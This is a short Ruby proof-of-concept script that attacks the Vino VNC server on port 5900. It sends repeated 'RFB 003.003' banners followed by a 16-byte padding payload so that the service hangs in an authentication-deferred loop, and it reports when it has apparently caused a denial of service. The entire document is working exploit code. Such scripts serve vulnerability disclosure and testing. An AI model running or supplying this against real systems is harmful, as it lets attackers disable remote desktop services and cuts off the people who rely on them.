-poc.rb ####

require 'socket'
require 'timeout'

# Just a couple payloads in a row should be enough to send Vino into an 
# (authentication deferred - ignoring client message loop) and spoil the party
client_banners = []
10.times {client_banners << "RFB 003.003"}

client_banners.each do |client_banner|
  puts "Testing " + client_banner

  begin

    Timeout::timeout(5) {
      sock = TCPSocket.open("a.b.c.d", 5900)
      puts "Waiting for Server Banner..."

      banner = sock.gets()
      puts "Got Server Banner: " + banner
      sock.write(client_banner + "\n")

      payload = "A" * 16
      puts "Sending Payload: " + payload
      sock.write(payload)

      sock.close
    }

  rescue Timeout::Error
    puts "Operations are timing out, you may have DoS'd the service"
  rescue Errno::ECONNREFUSED
    puts "Cannot connect to service, this is likely an IP/Port mismatch"
    exit
  end

end

############################
